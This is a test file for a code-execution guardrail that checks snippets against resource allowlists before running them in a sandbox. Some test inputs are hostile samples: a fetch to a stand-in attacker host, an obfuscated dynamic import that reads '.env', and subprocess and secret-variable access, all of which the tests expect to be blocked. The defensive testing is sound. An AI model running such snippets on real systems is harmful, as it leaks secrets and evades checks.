import { afterAll, beforeAll, describe, expect, it } from "vitest";
import os from "node:os";
import path from "node:path";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { buildRepoGraph, openGraph } from "../src/graph/index.js";
import type { GraphStore } from "../src/graph/index.js";
import { generateAllowlist } from "../src/guardrail/index.js";
import type { Allowlist } from "../src/guardrail/index.js";
import {
  checkAndRun,
  createGuardedContext,
} from "../src/guardrail/interceptor.js";

const fixtureRoot = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "fixtures",
  "graph_repo",
);

describe("guardrail interceptor", () => {
  const dbPath = path.join(
    os.tmpdir(),
    `mri-interceptor-test-${process.pid}-${Date.now()}.sqlite`,
  );
  let store: GraphStore;
  let fetchUserAllowlist: Allowlist;
  let moneyAllowlist: Allowlist;
  let resourceAllowlist: Allowlist;

  beforeAll(async () => {
    await buildRepoGraph(fixtureRoot, dbPath);
    store = openGraph(dbPath);
    fetchUserAllowlist = generateAllowlist("fn:src/api.js#fetchUser", store);
    moneyAllowlist = generateAllowlist("fn:src/format.js#money", store);
    resourceAllowlist = {
      ...fetchUserAllowlist,
      resources: {
        filesystem: [{ path: "/tmp/cache", access: ["read"] }],
        network: [{ host: "api.example.com" }],
        environment: [{ name: "API_KEY", access: "read" }],
        subprocess: [],
      },
    };
  });

  afterAll(() => {
    store.db.close();
  });

  it("runs code that stays within the allowlist", () => {
    const result = checkAndRun("6 * 7", moneyAllowlist);
    expect(result).toEqual({ outcome: "executed", value: 42 });
  });

  it("executes calls to granted symbols instead of blocking everything", () => {
    const sandbox = { helper: (n: number) => n * 2 };
    const context = vm.createContext(sandbox);
    const result = checkAndRun("helper(21)", fetchUserAllowlist, context);
    expect(result).toEqual({ outcome: "executed", value: 42 });
  });

  it("bridges host-provided modules for allowed imports", () => {
    const context = createGuardedContext(fetchUserAllowlist, {
      modules: {
        "./log": { log: (message: string) => `logged:${message}` },
      },
    });
    const result = checkAndRun(
      "const { log } = require('./log');\nlog('hi')",
      fetchUserAllowlist,
      context,
    );
    expect(result).toEqual({ outcome: "executed", value: "logged:hi" });
  });

  it("blocks require('fs') when filesystem access is not granted", () => {
    const result = checkAndRun("require('fs')", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    const breach = result.breaches[0];
    expect(breach?.kind).toBe("ungranted-resource");
    expect(breach?.line).toBe(1);
    expect(breach?.attempted).toContain("require('fs')");
    expect(breach?.rule).toEqual({
      area: "resources.filesystem",
      expected: "at least one resources.filesystem grant",
    });
    expect(breach?.message).toContain("'fs'");
  });

  it("blocks process.env reads that are not explicitly granted", () => {
    const result = checkAndRun("process.env.SOME_SECRET", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    const breach = result.breaches[0];
    expect(breach?.kind).toBe("ungranted-resource");
    expect(breach?.rule).toEqual({ area: "resources.environment", expected: "SOME_SECRET" });
    expect(breach?.line).toBe(1);
  });

  it("allows reads of specifically granted environment variables", () => {
    const context = createGuardedContext(resourceAllowlist, {
      environment: { API_KEY: "sekrit-value" },
    });
    const result = checkAndRun("process.env.API_KEY", resourceAllowlist, context);
    expect(result).toEqual({ outcome: "executed", value: "sekrit-value" });
  });

  it("blocks network calls to hosts without a grant but allows granted hosts", async () => {
    const blocked = checkAndRun(
      "fetch('https://evil.example.net/steal')",
      resourceAllowlist,
    );
    if (blocked.outcome !== "blocked") throw new Error("expected block");
    expect(blocked.breaches).toHaveLength(1);
    expect(blocked.breaches[0]?.kind).toBe("ungranted-resource");
    expect(blocked.breaches[0]?.rule).toEqual({
      area: "resources.network",
      expected: "https://evil.example.net",
    });

    const context = createGuardedContext(resourceAllowlist, {
      fetch: async () => "fetched-ok",
    });
    const allowed = checkAndRun(
      "fetch('https://api.example.com/v1/data')",
      resourceAllowlist,
      context,
    );
    if (allowed.outcome !== "executed") throw new Error("expected execution");
    expect(await (allowed.value as Promise<unknown>)).toBe("fetched-ok");
  });

  it("refuses network targets it cannot statically verify", () => {
    const result = checkAndRun(
      "const url = 'https://api.example.com/x';\nfetch(url)",
      resourceAllowlist,
    );
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("unverifiable-resource");
  });

  it("blocks disallowed internal imports while allowing listed ones", () => {
    const badImport = checkAndRun("import { pad } from './user'", fetchUserAllowlist);
    if (badImport.outcome !== "blocked") throw new Error("expected block");
    expect(badImport.breaches[0]?.kind).toBe("disallowed-import");
    expect(badImport.breaches[0]?.rule).toEqual({ area: "files", expected: "./user" });

    const goodImport = checkAndRun("import { log } from './log'", fetchUserAllowlist);
    expect(goodImport.outcome).toBe("executed");
  });

  it("checks named external bindings individually against symbol grants", () => {
    const allowed = checkAndRun("import { validate } from 'extlib'", fetchUserAllowlist);
    expect(allowed.outcome).toBe("executed");

    const smuggled = checkAndRun("import { missing } from 'extlib'", fetchUserAllowlist);
    if (smuggled.outcome !== "blocked") throw new Error("expected block");
    expect(smuggled.breaches[0]?.kind).toBe("disallowed-import");
    expect(smuggled.breaches[0]?.attempted).toContain("missing");
  });

  it("blocks references to identifiers that are neither granted nor safe globals", () => {
    const result = checkAndRun("mysteryFn()", fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]).toMatchObject({
      kind: "unknown-reference",
      line: 1,
      rule: { area: "symbols", expected: "mysteryFn" },
    });
  });

  it("never partially executes code containing violations", () => {
    let sideEffects = 0;
    const sandbox = {
      helper: (n: number) => {
        sideEffects += n;
        return n;
      },
    };
    const context = vm.createContext(sandbox);
    const result = checkAndRun(
      "helper(5)\nrequire('child_process')",
      fetchUserAllowlist,
      context,
    );
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.rule).toEqual({
      area: "resources.subprocess",
      expected: "at least one resources.subprocess grant",
    });
    expect(sideEffects).toBe(0);
  });

  it("blocks unparseable code instead of executing it blind", () => {
    const result = checkAndRun("function ({", moneyAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches[0]?.kind).toBe("parse-failure");
    expect(result.breaches[0]?.line).toBeGreaterThan(0);
  });

  it("blocks the dynamic import(variable) obfuscation shape before execution", () => {
    const code = [
      'const parts = ["node", "fs"];',
      'const mod = parts.join(":");',
      "import(mod).then((m) => {",
      '  console.log("exfiltrated via dynamic import:", m.readFileSync(".env", "utf8"));',
      "});",
    ].join("\n");
    const result = checkAndRun(code, fetchUserAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    const breach = result.breaches[0];
    expect(breach?.kind).toBe("unverifiable-import");
    expect(breach?.line).toBe(3);
    expect(breach?.attempted).toContain("import(mod)");
    expect(breach?.message).toContain("cannot be statically verified");
  });

  it("routes literal dynamic imports through the guarded require bridge", async () => {
    const context = createGuardedContext(fetchUserAllowlist, {
      modules: { "./log": { log: (message: string) => `logged:${message}` } },
    });
    const result = checkAndRun(
      "import('./log').then((m) => m.log('hi'))",
      fetchUserAllowlist,
      context,
    );
    if (result.outcome !== "executed") throw new Error("expected execution");
    expect(await (result.value as Promise<unknown>)).toBe("logged:hi");
  });

  it("converts escaping sandbox exceptions into blocked decisions, never crashes", () => {
    const result = checkAndRun('JSON.parse("{broken")', moneyAllowlist);
    if (result.outcome !== "blocked") throw new Error("expected block");
    expect(result.breaches).toHaveLength(1);
    expect(result.breaches[0]?.kind).toBe("denied-unclassifiable");
    expect(result.breaches[0]?.message).toContain("could not complete inside the sandbox");
  });
});
